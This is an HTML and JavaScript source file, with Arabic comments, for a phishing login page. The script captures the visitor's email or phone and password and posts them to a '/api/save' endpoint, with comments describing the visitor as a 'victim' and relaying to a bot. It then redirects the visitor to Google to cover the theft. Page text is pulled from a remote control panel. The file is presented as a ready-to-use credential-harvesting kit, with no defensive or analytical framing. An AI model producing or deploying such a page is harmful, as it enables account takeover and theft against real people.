<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        /* إعدادات الخلفية العامة للموقع */
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); /* خلفية ملونة متدرجة */
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        /* تنسيق بطاقة تسجيل الدخول */
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 380px;
            text-align: center;
        }

        #pageImg {
            width: 100%;
            height: auto;
            border-radius: 10px;
            margin-bottom: 20px;
            object-fit: cover;
        }

        h2 {
            color: #333;
            margin-bottom: 20px;
            font-size: 22px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box; /* لضمان عدم خروج الإدخال عن الإطار */
            outline: none;
            transition: 0.3s;
        }

        input:focus {
            border-color: #764ba2;
            box-shadow: 0 0 5px rgba(118, 75, 162, 0.3);
        }

        button {
            width: 100%;
            padding: 12px;
            background: #764ba2;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }

        button:hover {
            background: #5a3a7e;
            transform: translateY(-2px);
        }
    </style>
</head>
<body>

    <div class="login-box">
        <img id="pageImg" src="https://via.placeholder.com/400x200?text=جاري+التحميل..." alt="Header">
        
        <h2 id="pageLetter">جاري تحميل البيانات...</h2>

        <form id="victimForm">
            <input type="text" id="username" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" id="password" placeholder="كلمة السر" required>
            
            <button type="submit" id="pageBtn">تسجيل دخول</button>
        </form>
    </div>

    <script>
        // دالة لجلب الإعدادات من اللوحة تلقائياً
        async function fetchConfig() {
            try {
                const response = await fetch('/api/get');
                const data = await response.json();
                
                if (data.image) document.getElementById('pageImg').src = data.image;
                if (data.letter) document.getElementById('pageLetter').innerText = data.letter;
                if (data.button) document.getElementById('pageBtn').innerText = data.button;
            } catch (err) {
                console.error("خطأ في جلب الإعدادات");
            }
        }

        // إرسال بيانات الضحية للبوت
        document.getElementById('victimForm').onsubmit = async (e) => {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            await fetch('/api/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    image: "🔑 ضحية جديدة سقطت!",
                    letter: "المستخدم: " + user,
                    button: "الباسورد: " + pass
                })
            });

            // توجيه الضحية بعد الانتهاء
            window.location.href = "https://www.google.com";
        };

        // تنفيذ جلب الإعدادات عند فتح الصفحة
        window.onload = fetchConfig;
    </script>
</body>
</html>
